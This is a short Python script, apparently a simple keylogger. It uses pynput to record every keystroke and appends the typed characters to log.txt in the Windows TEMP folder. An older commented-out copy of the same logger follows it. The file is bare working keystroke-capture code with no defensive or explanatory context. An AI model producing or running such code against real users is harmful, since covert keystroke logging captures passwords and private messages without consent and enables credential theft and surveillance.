import os
from pynput.keyboard import Key, Listener

# Always write log to the Windows TEMP folder
temp_dir = os.getenv("TEMP")
log_path = os.path.join(temp_dir, "log.txt")

print("Logging to:", log_path)

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        write_file()
        keys = []
        count = 0

def write_file():
    with open(log_path, "a", encoding="utf-8", errors="ignore") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write(" ")
            elif "Key" not in k:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


##
##
##import pynput
##
##from pynput.keyboard import Key, Listener
##
##count = 0
##keys = []
##
##def on_press(key):
##   global keys, count
##
##   keys.append(key)
##   count += 1
##   print("{0} pressed" .format(key))
##
##   if count >= 10:
##       count = 0
##       write_file()
##       keys = []
##
##
##def write_file():
##    with open("log.txt", "a") as f:
##        for key in keys:
##            k = str(key).replace("'","")
##            if k.find("space") > 0:
##                f.write(" ")
##            elif k.find("Key") == -1:
##                f.write(k)
##
##
##def on_release(key):
##    if key == Key.esc:
##        return False
##
##
##with Listener(on_press=on_press, on_release=on_release) as listener:
##    listener.join()
